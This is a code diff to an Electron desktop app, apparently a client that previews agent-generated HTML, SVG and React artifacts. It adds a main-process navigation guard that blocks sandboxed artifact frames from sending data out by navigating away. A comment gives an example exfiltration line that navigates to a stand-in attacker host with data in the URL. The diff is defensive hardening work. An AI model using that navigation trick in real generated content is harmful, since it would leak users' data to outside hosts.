@@ -706,6 +706,42 @@ function createWindow(): BrowserWindow {
     return { action: 'deny' };
   });
 
+  // Main-process navigation backstop for the main window AND its subframes.
+  // Artifact previews render agent-supplied html/svg/react inside a
+  // sandbox="allow-scripts" srcdoc iframe under a strict CSP, but Chromium does
+  // NOT enforce the CSP `navigate-to` directive — so a malicious artifact can
+  // still exfiltrate via self-navigation (`location='https://attacker/?data'`
+  // or <meta http-equiv=refresh>). The renderer's onLoad guard is too late (the
+  // request already fired) and bypassable. This will-frame-navigate handler runs
+  // in the main process BEFORE the request and can't be defeated by the frame:
+  // allow only the app's own origin (dev server / file://) and about: schemes
+  // (about:blank, about:srcdoc — the artifact frames). Anything else is denied +
+  // safe-routed to the OS browser (a user-clicked http(s) link still opens).
+  const rendererUrl = process.env.ELECTRON_RENDERER_URL;
+  const isAllowedFrameNavigation = (target: string): boolean => {
+    if (/^about:/i.test(target)) return true; // about:blank / about:srcdoc (artifact frames)
+    let parsed: URL;
+    try {
+      parsed = new URL(target);
+    } catch {
+      return true; // unparseable / relative → not a cross-origin egress
+    }
+    if (parsed.protocol === 'file:') return true;
+    if (rendererUrl) {
+      try {
+        if (parsed.origin === new URL(rendererUrl).origin) return true; // dev server
+      } catch {
+        /* ignore */
+      }
+    }
+    return false;
+  };
+  mainWindow.webContents.on('will-frame-navigate', (event) => {
+    if (isAllowedFrameNavigation(event.url)) return;
+    event.preventDefault();
+    openExternalSafely(event.url);
+  });
+
   // Grant the small set of renderer permissions we explicitly support.
   const allowedPermissions = ['media', 'microphone', 'audioCapture', 'clipboard-read', 'clipboard-sanitized-write'];
   mainWindow.webContents.session.setPermissionRequestHandler((_webContents, permission, callback) => {
